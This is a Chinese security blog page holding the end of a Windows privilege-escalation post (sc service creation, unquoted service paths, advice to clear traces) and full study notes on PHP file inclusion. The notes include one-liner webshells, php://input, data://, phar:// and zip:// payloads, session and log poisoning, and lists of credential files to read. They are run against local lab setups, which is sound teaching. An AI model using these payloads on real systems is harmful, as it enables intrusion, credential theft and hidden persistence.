<h4 id="windows7、8、12、16"><a href="#windows7、8、12、16" class="headerlink" title="windows7、8、12、16"></a>windows7、8、12、16</h4><h5 id="SC命令提权"><a href="#SC命令提权" class="headerlink" title="SC命令提权"></a>SC命令提权</h5><p>经测试03也可以</p>
<p>关于sc命令：</p>
<pre><code>SC 是用于与服务控制管理器和服务进行通信的命令行程序。提供的功能类似于“控制面板”中“管理工具”项中的“服务”。</code></pre><p>创建一个名叫syscmd的新的交互式的cmd服务:</p>
<pre><code>SC Create syscmd binPath= &quot;cmd /K start&quot; type= own type= interact</code></pre><p>然后执行：</p>
<pre><code>sc start systcmd</code></pre><p>就得到了一个system权限的cmd环境</p>
<p><img src="https://img2018.cnblogs.com/blog/1344396/201905/1344396-20190522155851751-1387514150.jpg" alt="img"></p>
<h4 id="通过不带引号的服务路径"><a href="#通过不带引号的服务路径" class="headerlink" title="通过不带引号的服务路径"></a>通过不带引号的服务路径</h4><p>当系统管理员配置Windows服务时，他们必须指定要执行的命令，或者运行可执行文件的路径。</p>
<p>当Windows服务运行时，会发生以下两种情况之一。如果给出了可执行文件，并且引用了完整路径，则系统会按字面解释它并执行。但是，如果服务的二进制路径未包含在引号中，则操作系统将会执行找到的空格分隔的服务路径的第一个实例。</p>
<p>这可能有点不直观，所以让我们来看一个实际的例子。假设服务配置类似于以下存在bug的示例服务：</p>
<p><img src="https://img2018.cnblogs.com/blog/1344396/201905/1344396-20190522161040219-164078702.jpg" alt="img"></p>
<p>Windows命令解释程序可能会遇到名称中的空格，并且希望通过将字符串包装在引号中来对它们进行转义。在上面的示例中，如果系统运行该服务，它将尝试运行以下可执行文件：</p>
<pre><code>C:\Program.exe
C:\Program Files\Vulnerable.exe
C:\Program Files\Vulnerable Service\Sub.exe
C:\Program Files\Vulnerable Service\Sub Directory\service.exe</code></pre><p>所以如果我们能够上传一个适当命名的恶意可执行程序在受影响的目录，服务一旦重启，我们的恶意程序就会以system权限运行(大多数情况下)。</p>
<p>我们可以使用以下命令查看错误配置的路径</p>
<pre><code>wmic service get name,displayname,pathname,startmode |findstr /i &quot;Auto&quot; |findstr /i /v &quot;C:\Windows\\&quot; |findstr /i /v &quot;&quot;&quot;</code></pre><p><img src="https://img2018.cnblogs.com/blog/1344396/201905/1344396-20190522161224135-116677485.jpg" alt="img"></p>
<p>这里我们枚举出下列路径：</p>
<pre><code>C:\Program Files (x86)\Cisco\Cisco HostScan\bin\ciscod.exe</code></pre><p>个路径没有被双引号包裹，而且文件名中也存在空格。</p>
<p>现在，我们需要使用下列命令识别文件目录权限，判断是否有写入权限：</p>
<pre><code>icacls C:\Program Files (x86)\Cisco</code></pre><p>M)代表修改权限，(F)代表完全控制，(CI)代表从属容器将继承访问控制项，(OI)代表从属文件将继承访问控制项。</p>
<p>如果它给任何人提供了写入权限，这也就意味着任何用户都可以重写该文件</p>
<p>将我们需要执行的exe根据需要重命名并放置在可写入的有漏洞目录下，然后运行如下命令尝试重启服务，如果失败的话等待服务器重启时执行exe，成功提权后记得清理痕迹。</p>
<p><img src="https://img2018.cnblogs.com/blog/1344396/201905/1344396-20190522161926904-1449078879.jpg" alt="img"></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/04/03/wen-jian-bao-han-lou-dong-xue-xi-bi-ji/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Shu1L">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/04/03/wen-jian-bao-han-lou-dong-xue-xi-bi-ji/" itemprop="url">文件包含漏洞学习笔记</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-03T12:42:02+08:00">
                2020-04-03
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index">
                    <span itemprop="name">web漏洞学习</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="文件包含漏洞学习"><a href="#文件包含漏洞学习" class="headerlink" title="文件包含漏洞学习"></a>文件包含漏洞学习</h2><h4 id="文件包含漏洞相关知识点"><a href="#文件包含漏洞相关知识点" class="headerlink" title="文件包含漏洞相关知识点"></a>文件包含漏洞相关知识点</h4><h5 id="什么是文件包含？"><a href="#什么是文件包含？" class="headerlink" title="什么是文件包含？"></a>什么是文件包含？</h5><p>​       服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP执行，这会为开发者节省大量的时间。这意味着您可以创建供所有网页引用的标准页眉或菜单文件。当页眉需要更新时，您只更新一个包含文件就可以了，或者当您向网站添加一张新页面时，仅仅需要修改一下菜单文件（而不是更新所有网页中的链接）。</p>
<h5 id="文件包含函数"><a href="#文件包含函数" class="headerlink" title="文件包含函数"></a>文件包含函数</h5><ul>
<li>require()</li>
<li>require_once()</li>
<li>include()</li>
<li>include_once()</li>
</ul>
<p><strong><code>include</code>和<code>require</code>区别</strong>:<code>include</code>在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；而<code>require</code>函数出现错误的时候，会直接报错并退出程序的执行。</p>
<p>而<code>include_once()</code>，<code>require_once()</code>这两个函数，与前两个的不同之处在于这两个函数只包含一次，适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题。</p>
<p><img src="D:%5C%E5%9B%BE%E7%89%87%5C9272355-7889a572371b18c8.png" alt=""></p>
<h5 id="漏洞产生的原因"><a href="#漏洞产生的原因" class="headerlink" title="漏洞产生的原因"></a>漏洞产生的原因</h5><p>文件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，包含其他恶意文件，导致执行了非预期的代码。</p>
<p>示例代码：</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
       <span class="token variable">$filename</span><span class="token operator">=</span><span class="token variable">$GET</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
       <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span></code></pre>
<p><code>$_GET[&#39;filename&#39;]</code>参数开发者没有经过严格的过滤，直接带入了include的函数，攻击者可以修改<code>$_GET[&#39;filename&#39;]</code>的值，执行非预期的操作。</p>
<h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h4><p>文件包含分为：本地(LFI)/远程(RFI)包含</p>
<p>本地文件包含漏洞，顾名思义，指的是能打开并包含本地文件的漏洞。大部分情况下遇到的文件包含漏洞都是LFI。简单的测试用例如前所示。</p>
<p>远程文件包含漏洞。是指能够包含远程服务器上的文件并执行。由于远程服务器的文件是我们可控的，因此漏洞一旦存在危害性会很大。<br> 但RFI的利用条件较为苛刻，需要php.ini中进行配置</p>
<pre class=" language-undefined"><code class="language-undefined">allow_url_fopen = On
allow_url_include = On，重启apache，即可生效</code></pre>
<p>两个配置选项均需要为On，才能远程包含文件成功。<br> 另外一台需要开启apache</p>
<pre class=" language-kotlin"><code class="language-kotlin">apt<span class="token operator">-</span><span class="token keyword">get</span> install apache2
 <span class="token operator">/</span>etc<span class="token operator">/</span><span class="token keyword">init</span><span class="token punctuation">.</span>d<span class="token operator">/</span>apache2 start</code></pre>
<p><img src="https://upload-images.jianshu.io/upload_images/9272355-952116d80dc7f768.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200" alt="img"></p>
<p>1.png</p>
<p><img src="https://upload-images.jianshu.io/upload_images/9272355-e288840e08e52b5e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/376" alt="img"></p>
<p>2.png<br> 注：在php.ini中，allow_url_fopen默认一直是On，而<code>allow_url_include</code>从php5.2之后就默认为Off。<br> 下面例子中测试代码均为：</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">include</span> <span class="token variable">$file</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span></code></pre>
<p>allow_url_fopen 默认为 On<br> allow_url_include 默认为 Off<br> 若有特殊要求，会在利用条件里指出。</p>
<h4 id="本地文件包含漏洞"><a href="#本地文件包含漏洞" class="headerlink" title="本地文件包含漏洞"></a>本地文件包含漏洞</h4><h5 id="一、无限制本地文件包含漏洞"><a href="#一、无限制本地文件包含漏洞" class="headerlink" title="一、无限制本地文件包含漏洞"></a>一、无限制本地文件包含漏洞</h5><p><strong>测试代码：</strong></p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
    <span class="token variable">$filename</span> <span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span></code></pre>
<p><strong>常见的敏感信息目录：</strong></p>
<p>window系统：</p>
<ul>
<li>c:\boot.ini //查看系统版本</li>
<li>c:\windows\system32\inetsrv\MetaBase.xml //IIS配置</li>
<li>c:\windows\repair\sam  // 存储Windows系统初次安装的密码</li>
<li>c:\ProgramFiles\mysql\my.ini // MySQL配置</li>
<li>c:\ProgramFiles\mysql\data\mysql\user.MYD // MySQL root密码</li>
<li>c:\windows\php.ini // php 配置信息</li>
</ul>
<p>Linux系统</p>
<ul>
<li>/etc/passwd // 账户信息</li>
<li>/etc/shadow // 账户密码文件</li>
<li>/usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件</li>
<li>/etc/my.conf // mysql 配置文件</li>
</ul>
<h5 id="二、session文件包含漏洞"><a href="#二、session文件包含漏洞" class="headerlink" title="二、session文件包含漏洞"></a>二、session文件包含漏洞</h5><p><strong>利用条件</strong></p>
<p>1.我们可以通过phpinfo的信息泄露获取到session的存储位置</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200123104312.png" alt=""></p>
<p>2.或者通过猜测默认的session存放位置</p>
<p>linux下的默认存储目录为/var/lib/php/session</p>
<p><strong>利用过程</strong></p>
<p>我们可以先使用文件包含上传恶意代码，比如</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$ctfs</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'ctfs'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$ctfs</span><span class="token punctuation">;</span>

<span class="token delimiter">?></span></code></pre>
<p>此php会将获取到的GET型ctfs变量的值存入到session中。如果存在本地文件包含漏洞，就可以通过ctfs写入恶意代码到session文件中，然后通过文件包含漏洞执行此恶意代码。<br>我们构造：</p>
<img src="QQ截图20200123104221.png" style="zoom:80%;" />

<p>我们发现在本地session所在目录下存储了session的值</p>
<img src="QQ截图20200123105708.png" style="zoom:80%;" />

<p>攻击者通过phpinfo()信息泄露或者猜测获取到session存放的目录位置，然后通过浏览器自带开发者模式获取到文件名称：sess_lotipf7ccidsbsrltdau35rb65</p>
<img src="QQ截图20200123103711.png" style="zoom:150%;" />

<p>构造本地文件包含 ：<strong>file.php?D:\phpStudy\PHPTutorial\tmp\tmp\sess_lotipf7ccidsbsrltdau35rb65</strong></p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200123104500.png" alt=""></p>
<h5 id="三、有限制本地文件包含漏洞绕过"><a href="#三、有限制本地文件包含漏洞绕过" class="headerlink" title="三、有限制本地文件包含漏洞绕过"></a>三、有限制本地文件包含漏洞绕过</h5><p><strong>%00截断</strong></p>
<p>条件：magic_quotes_gpc=Off  并且php版本&lt;5.3.4</p>
<p><strong>测试代码</strong></p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
    <span class="token variable">$filename</span>  <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$filename</span> <span class="token punctuation">.</span> <span class="token string">".html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span></code></pre>
<p>当我们直接包含本地的test.txt时</p>
<img src="QQ截图20200123113838.png" style="zoom:67%;" />

<p>我们在test.txt加上%00进行截断</p>
<img src="QQ截图20200123113851.png" style="zoom:67%;" />







<p><strong>四、路径长度限制</strong></p>
<p>条件：windows OS,点号需要长于256；linuxOS 长于4096</p>
<pre><code>windows下目录最大长度为256字节，超出的部分会被丢弃；
linux下目录最大长度为4096字节，超出的部分会被丢弃。</code></pre><p>测试代码：</p>
<pre><code>&lt;?php
   $filename =$_GET[&#39;filename&#39;];
   include($filename . &quot;.html&quot;);
   ?&gt;</code></pre><h4 id="远程文件包含漏洞"><a href="#远程文件包含漏洞" class="headerlink" title="远程文件包含漏洞"></a>远程文件包含漏洞</h4><p>PHP的配置文件allow_url_fopen和allow_url_include设置为ON，include/require等包含函数可以加载远程文件，如果远程文件没经过严格的过滤，导致了执行恶意文件的代码，这就是远程文件包含漏洞。</p>
<pre><code>allow_url_fopen = On（是否允许打开远程文件）
allow_url_include = On（是否允许include/require远程文件）</code></pre><p>示例：</p>
<p>测试代码：</p>
<pre><code>&lt;?php
    $filename  = $_GET[&#39;filename&#39;];
    include($filename);
?&gt;</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200203191630.png" alt=""></p>
<h4 id="PHP伪协议在文件包含中的应用"><a href="#PHP伪协议在文件包含中的应用" class="headerlink" title="PHP伪协议在文件包含中的应用"></a>PHP伪协议在文件包含中的应用</h4><p>PHP带有很多内置URL风格的封装协议，可用于类似fopen()、copy()、file_exists()和filesize()的文件系统函数。除了这些封装协议、还能通过stream_wrapper_register() 来注册自定义的封装协议。</p>
<p><strong>php伪协议类别</strong></p>
<ul>
<li>file://    访问本地文件系统</li>
<li>http://   访问HTTP（s)网址</li>
<li>ftp://     访问FTP(s) URLs</li>
<li>php://      访问各个输入/输出流</li>
<li>zlib://     压缩流</li>
<li>data://  数据</li>
</ul>
<p><strong>php://filter(本地磁盘文件进行读取）</strong></p>
<p>元封装器，设计用于“数据流打开“时的”筛选过滤“应用，对本地磁盘文件进行读写。</p>
<p>用法：?filename=php://filter/convert.base64-encode/resource=xxx.php</p>
<p>条件：需要开启allow_url_fopen</p>
<p>示例：</p>
<p>本地新建file.php</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200128205700.png" alt=""></p>
<p>我们使用php伪协议在本地读取shell.php文件中的内容</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200128205953.png" alt=""></p>
<p>对得到的Base64进行解码即可。</p>
<p><strong>file://伪协议（读取文件内容）</strong></p>
<p>通过file协议可以访问本地文件系统，读取到文件的内容</p>
<p>示例：</p>
<img src="QQ截图20200203184038.png" style="zoom:67%;" />



<h5 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h5><p>可以访问请求的原始数据的只读流。即可以直接读取到POST上没有经过解析的原始数据。 enctype=”multipart/form-data” 的时候 php://input 是无效的。</p>
<p>用法：?file=php://input 数据利用POST传过去。</p>
<p>利用条件：</p>
<p>allow_url_include = On。<br> 对allow_url_fopen不做要求</p>
<pre><code>&lt;?phpinfo();?&gt;
&lt;?php system(&#39;whoami&#39;);?&gt;
&lt;?php fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php eval(\$_POST[&#39;caidao&#39;];?&gt;)&quot;)?&gt;</code></pre><p>包含姿势：</p>
<pre><code>index.php
?file=php://input

POST:
&lt;? phpinfo();?&gt;</code></pre><h5 id="php-input-（读取POST数据）"><a href="#php-input-（读取POST数据）" class="headerlink" title="php://input （读取POST数据）"></a>php://input （读取POST数据）</h5><p>​      碰到file_get_contents()就要想到用php://input绕过，因为php伪协议也是可以利用http协议的，即可以使用POST方式传数据，具体函数意义下一项；</p>
<p>测试代码：</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span>"php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//input");</span>
<span class="token delimiter">?></span></code></pre>
<img src="QQ截图20200203182852.png" style="zoom:67%;" />

<h5 id="php-input-命令执行"><a href="#php-input-命令执行" class="headerlink" title="php://input(命令执行)"></a>php://input(命令执行)</h5><p>测试代码：</p>
<pre><code>&lt;?php
    $filename  = $_GET[&#39;filename&#39;];
    include($filename);
?&gt;</code></pre><p>条件：php配置文件中需同时开启 allow_url_fopen 和 allow_url_include（PHP &lt; 5.30）,就可以造成任意代码执行，在这可以理解成远程文件包含漏洞（RFI），即POST过去PHP代码，即可执行；</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200203183726.png" alt=""></p>
<h5 id="data-伪协议"><a href="#data-伪协议" class="headerlink" title="data://伪协议"></a>data://伪协议</h5><p>数据流封装器，和php://相似都是利用了流的概念，将原本的include的文件流重定向到了用户可控制的输入流中，简单来说就是执行文件的包含方法包含了你的输入流，通过你输入payload来实现目的。</p>
<p>利用条件：</p>
<p>php版本大于等于php5.2<br> allow_url_fopen = On<br> allow_url_include = On</p>
<p>示例1：</p>
<pre><code>/index2.php?file=data:text/plain,&lt;?php phpinfo();?&gt;</code></pre><p><img src="https://upload-images.jianshu.io/upload_images/9272355-5449b681b9c47ddb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200" alt="img"></p>
<p>执行命令：</p>
<pre><code>index2.php?file=data:text/plain;&lt;?php system(&quot;whoami&quot;);?&gt;</code></pre><p><img src="https://upload-images.jianshu.io/upload_images/9272355-0fce621191e72481.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/885" alt="img"></p>
<p>示例2：</p>
<pre><code>/index2.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</code></pre><p>加号<code>+</code>的url编码为<code>%2b</code>，<code>PD9waHAgcGhwaW5mbygpOz8+</code>的base64解码为：<?php phpinfo() ?></p>
<p><strong>包含session</strong></p>
<p>利用条件：session文件路径已知，且其中内容部分可控。</p>
<p>思路：结合phpmyadmin,因为phpmyadmin每次登录时，会带上session。</p>
<p><img src="D:%5C%E5%9B%BE%E7%89%87%5C9272355-dd5195fec4210a53.png" alt=""></p>
<p>session文件的绝对路径可在phpinfo中查看，session.save_path</p>
<p><img src="https://upload-images.jianshu.io/upload_images/9272355-1e7dd8fd1a028711.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/608" alt="img"></p>
<p>常见的php-session存放位置还有这几个：</p>
<pre class=" language-csharp"><code class="language-csharp"><span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>lib<span class="token operator">/</span>php<span class="token operator">/</span>sess_PHPSESSID
<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>lib<span class="token operator">/</span>php<span class="token operator">/</span>sess_PHPSESSID
<span class="token operator">/</span>tmp<span class="token operator">/</span>sess_PHPSESSID
<span class="token operator">/</span>tmp<span class="token operator">/</span>sessions<span class="token operator">/</span>sess_PHPSESSID</code></pre>
<p>使用以下命令可查看到session文件中的登录信息</p>
<pre class=" language-csharp"><code class="language-csharp">strings <span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>lib<span class="token operator">/</span>php5<span class="token operator">/</span>sess_258c1be1b00d080bddc58d2896460542facb6f1f <span class="token operator">|</span> grep root</code></pre>
<p><img src="https://upload-images.jianshu.io/upload_images/9272355-940bb1d740bd0d47.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/723" alt="img"></p>
<p>登录phpmyadmin时，用户名输入一句话木马，再包含session文件，可getshell</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'root'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span></code></pre>
<p><img src="https://upload-images.jianshu.io/upload_images/9272355-c833b1fd110b6170.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200" alt="img"></p>
<p><img src="https://upload-images.jianshu.io/upload_images/9272355-5304d206d0b1fcc8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/729" alt="img"></p>
<p>使用菜刀连接<br> <a href="http://192.168.1.127/dvwa/vulnerabilities/fi/?page=../../../../../../var/lib/php5/sess_6cf7f14ec1e50c6b2f6d4a8ec671e7aaf92c6c4c" target="_blank" rel="noopener">http://192.168.1.127/dvwa/vulnerabilities/fi/?page=../../../../../../var/lib/php5/sess_6cf7f14ec1e50c6b2f6d4a8ec671e7aaf92c6c4c</a><br> 在浏览器里有你的cookie所以你可以直接去访问对应的文件包含页面，用菜刀的话是没有cookie的所以你没有办法去访问文件包含页面也就是fi那个页面。所以说会自动跳转到登录页面，显示200ok</p>
<p>加上cookie之后在重新连接，成功连接</p>
<p><img src="https://upload-images.jianshu.io/upload_images/9272355-44a9d0f1054d26b9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/790" alt="img"></p>
<h5 id="phar伪协议"><a href="#phar伪协议" class="headerlink" title="phar伪协议"></a>phar伪协议</h5><ul>
<li><p>利用条件：php版本大于等于php5.3.0</p>
</li>
<li><p>这个参数就是php解压缩包的一个函数，不管后缀是什么，都会被当做压缩包来解压。</p>
<p>用法：?file=phar://压缩包/内部文件 phar://xxx.png/shell.php </p>
<p>注意： PHP &gt; =5.3.0 压缩包需要是zip协议压缩，rar不行，将木马文件压缩后，改为其他任意格式的文件都可以正常使用。 步骤： 写一个一句话木马文件shell.php，然后用zip协议压缩为shell.zip，然后将后缀改为png等其他格式。 </p>
</li>
<li><p>姿势：假设有个文件phpinfo.txt，其内容为<?php phpinfo(); ?>，打包成zip压缩包，如下：</p>
</li>
</ul>
<p><img src="D:%5C%E5%9B%BE%E7%89%87%5C9272355-041eece378dca1e4.png" alt=""></p>
<p>指定绝对路径：</p>
<pre><code>index2.php?file=phar://C:\phpStudy\WWW\FileInclusion\phpinfo.zip\phpinfo.txt</code></pre><p>或者利用相对路径（这里phpinfo.zip就在当前目录下）</p>
<pre><code>index2.php?file=phar://phpinfo.zip/phpinfo.txt</code></pre><p><img src="D:%5C%E5%9B%BE%E7%89%87%5C9272355-489da319d283d845.png" alt=""></p>
<h5 id="zip：-伪协议"><a href="#zip：-伪协议" class="headerlink" title="zip：//伪协议"></a>zip：//伪协议</h5><ul>
<li><p>php版本大于等于php5.3.0</p>
</li>
<li><p>zip伪协议和phar协议类似，但是用法不一样。</p>
</li>
<li><p>用法：?file=zip://[压缩文件绝对路径]#[压缩文件内的子文件名] zip://xxx.png#shell.php</p>
</li>
<li><p>条件： PHP &gt; =5.3.0，注意在windows下测试要5.3.0&lt;PHP&lt;5.4 才可以 #在浏览器中要编码为%23，否则浏览器默认不会传输特殊字符。</p>
</li>
</ul>
<pre><code>index2.php?file=zip://C:\phpStudy\WWW\FileInclusion\phpinfo.zip%23phpinfo.txt</code></pre><h3 id="包含日志文件"><a href="#包含日志文件" class="headerlink" title="包含日志文件"></a>包含日志文件</h3><p>当我们没有上传点，并且也没有url_allow_include功能时，我们就可以考虑包含服务器的日志文件。<br>利用思路也比较简单，当我们访问网站时，服务器的日志中都会记录我们的行为，当我们访问链接中包含PHP一句话木马时，也会被记录到日志中。<br>这时候我们如果知道服务器的日志位置，我们可以去包含这个文件从而拿到shell。其实整个“包含日志文件漏洞利用”最关键的就是找日志存放的“物理路径”，只要找到日志的物理存放路径，一切就可以按部就班的完成利用了。<br>利用的条件：</p>
<ul>
<li>1.日志的物理存放路径</li>
<li>2.存在文件包含漏洞</li>
</ul>
<p>获取日志存放路径</p>
<p>（一）日志默认路径</p>
<p>(1) apache+Linux日志默认路径</p>
<pre class=" language-undefined"><code class="language-undefined">    /etc/httpd/logs/access_log</code></pre>
<p>或者</p>
<pre class=" language-bash"><code class="language-bash">    /var/log/httpd/access_log</code></pre>
<p>(2) apache+win2003日志默认路径</p>
<pre class=" language-cpp"><code class="language-cpp">    D<span class="token operator">:</span>\xampp\apache\logs\access<span class="token punctuation">.</span>log
    D<span class="token operator">:</span>\xampp\apache\logs\error<span class="token punctuation">.</span>log</code></pre>
<p>(3) IIS6.0+win2003默认日志文件</p>
<pre class=" language-undefined"><code class="language-undefined">    C:\WINDOWS\system32\Logfiles</code></pre>
<p>(4) IIS7.0+win2003 默认日志文件</p>
<pre class=" language-undefined"><code class="language-undefined">    %SystemDrive%\inetpub\logs\LogFiles</code></pre>
<p>(5) nginx 日志文件</p>
<pre class=" language-bash"><code class="language-bash">    日志文件在用户安装目录logs目录下
            以我的安装路径为例/usr/local/nginx,
            那我的日志目录就是在/usr/local/nginx/logs里</code></pre>
<p>首先，我们直接使用浏览器来构造“php一句话报错请求信息”服务自动记录此一句话信息到服务器日志文件中；<br>具体构造内容：</p>
<pre class=" language-xml"><code class="language-xml"> http://127.0.0.1:81/FileInclusion/index2.php?file=<span class="token prolog">&lt;?php @eval($_POST[c]);?></span></code></pre>
<p><img src="https:////upload-images.jianshu.io/upload_images/9272355-f9f0db6a9d7ff53a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/964" alt="img"></p>
<p>（2）测试结果：失败<br>利用文件包含漏洞直接访问“服务日志文件”，发现文件包含漏洞并未对构造的php一句话进行正常解析，观察发现是构造的PHP一句话中的相关字符在记录进日志文件后，相关的字符被转码了，导致PHP解析失败，具体失败原因见“失败原因分析”</p>
<p><img src="https:////upload-images.jianshu.io/upload_images/9272355-738380f7e8b09e46.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1195" alt="img"></p>
<p>image.png（3）失败原因分析<br>一句话写入日志文件的利用过程是，利用浏览器直接构造一个关于请求资源的报错信息，消息中包含依据。报错信息服务自动记录到日志文件，但实际测试发现写入日志文件内的报错信息发生了字符转码：<br>日志文件内容如上图所示：</p>
<pre class=" language-ruby"><code class="language-ruby">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token punctuation">:</span><span class="token number">81</span><span class="token operator">/</span><span class="token constant">FileInclusion</span><span class="token operator">/</span>index2<span class="token punctuation">.</span>php<span class="token operator">?</span>page<span class="token operator">=</span><span class="token operator">%</span>3C<span class="token operator">?</span>php<span class="token operator">%</span><span class="token number">20</span><span class="token variable">@eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">?</span><span class="token operator">%</span>3E</code></pre>
<pre class=" language-rust"><code class="language-rust">               <span class="token string">"&lt;"</span>  <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">-></span> 大于号被转码为了 <span class="token operator">%</span>3C
                <span class="token string">">"</span>  <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">-></span> 小于号被转码为了 <span class="token operator">%</span>3E
                <span class="token string">" "</span>   <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">-></span> 空格被转码为了 <span class="token operator">%</span><span class="token number">20</span></code></pre>
<p>最后写入到日志文件中的一句话就变成了 %3C?php%20@eval($_POST[c]);?%3E。</p>
<p>（4） 失败总结<br>浏览器直接构造的PHP一句话中特殊字符，会被浏览器自动进行URL转义，导致最终写入日志文件中的PHP一句话包含了这些特殊字符，而这些转码后的编码PHP并不能进行正常的解析。<br>（5）构造一句话，写入日志文件测试记录<br>burpsuit 代理抓包改包构造一句话写入日志文件<br>（1） burpsuit 代理抓包，修改浏览器转码字符，写入正确的php一句话木马到服务器日志文件。</p>
<p><img src="https:////upload-images.jianshu.io/upload_images/9272355-ff2a0beae4cc4468.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200" alt="img"></p>
<p>（2） 测试记录：成功<br>通过文件包含直接访问服务日志文件，发现一句话被执行成功；</p>
<p><img src="https:////upload-images.jianshu.io/upload_images/9272355-f5d368a6f62b9802.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/889" alt="img"></p>
